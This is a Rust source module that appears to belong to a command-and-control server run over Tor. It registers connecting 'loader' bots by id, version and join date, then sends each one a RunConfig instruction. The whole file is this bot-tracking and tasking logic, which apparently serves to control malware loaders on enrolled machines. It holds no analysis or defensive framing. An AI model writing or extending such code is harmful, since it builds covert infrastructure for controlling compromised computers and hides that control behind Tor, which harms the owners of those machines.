use std::{ collections::HashMap, sync::Arc };
use chrono::Utc;
use loader_vars::types::{
    receive::{ ClientAction, ClientParams, RunConfigParams },
    send::{ LoaderSendPayload, ServerAction, ServerParams },
};
use tokio::{ net::TcpStream, sync::{ Mutex, RwLock } };
use super::tor::{ LoaderBot, TorServerHandler };
use anyhow::Result;

pub async fn route_loader(
    server_handler: &TorServerHandler,
    payload: LoaderSendPayload,
    stream_ref: Arc<Mutex<TcpStream>>
) -> Result<()> {
    match payload.action {
        ServerAction::GetConfig => { init(server_handler, payload, stream_ref).await }
    }
}

pub async fn init(
    server_handler: &TorServerHandler,
    payload: LoaderSendPayload,
    stream_ref: Arc<Mutex<TcpStream>>
) -> Result<()> {
    if let ServerParams::GetConfig(params) = payload.params {
        let mut id_map = server_handler.loader_bot_map.write().await;
        let lock = id_map
            .entry(payload.id.clone())
            .or_insert(Arc::new(RwLock::new(HashMap::new())));

        let mut version_map = lock.write().await;
        let current_time: String = Utc::now().to_string();
        version_map.insert(payload.version, LoaderBot {
            id: payload.id,
            join_date: current_time,
            version: payload.version,
        });
        drop(version_map);
        drop(id_map);
        TorServerHandler::send_action_to_loader(
            stream_ref,
            ClientAction::RunConfig,
            ClientParams::RunConfig(RunConfigParams::default())
        ).await
    } else {
        return Err(anyhow::anyhow!(format!("Invalid params for: {:#?}", payload.action)));
    }
}
